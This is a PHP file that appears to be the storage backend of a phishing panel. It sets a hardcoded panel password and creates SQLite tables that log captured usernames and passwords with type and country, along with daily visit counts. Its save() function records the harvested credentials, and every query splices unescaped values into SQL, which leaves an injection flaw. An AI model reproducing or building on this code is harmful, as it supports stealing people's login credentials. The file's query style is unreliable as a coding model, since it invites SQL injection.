<?php

$pass = '12345'; /// change panel pass here
$database_name = (isset($panel)) ? 'db.db' : 'panel/db.db';  // DB name

$db = new SQLite3($database_name);
$query = "CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, user varchar(255) NOT NULL, pass varchar(255) NOT NULL, date DATE  DEFAULT CURRENT_DATE,type varchar(255) NOT NULL DEFAULT Uknown,country varchar(255) NOT NULL DEFAULT Uknown)";
$db->exec($query);
$sql = "CREATE TABLE IF NOT EXISTS visits (id INTEGER PRIMARY KEY AUTOINCREMENT, visits int(11) NOT NULL, date DATE NOT NULL DEFAULT CURRENT_DATE)";
$db->exec($sql);



function visits(){
	global $db;
	$table = 'visits';
	$date = date("Y-m-d");

	$row = $db->query("SELECT COUNT(*) as count,id,visits FROM `$table` WHERE `date` = '$date'")->fetchArray();
	$id = $row['id'];
	$visits = $row['visits'];
	$count = $row['count'];

	if($count == 1){
		$visits +=1;
		$query = "UPDATE `$table` set `visits`='$visits' WHERE id=$id";
		$db->exec($query);
		
	}else{
		$query = "INSERT INTO `$table` (visits,date) VALUES (1,'$date')";
		$db->exec($query);
	}
}

function save($user,$pass,$type='Uknown',$country='Uknown'){
	global $db;
	$table = 'logs';
	$date = date("Y-m-d");

	$query = "INSERT INTO `$table` (user, pass, type,country) VALUES ('$user', '$pass', '$type', '$country')";
	$db->exec($query);

}

?>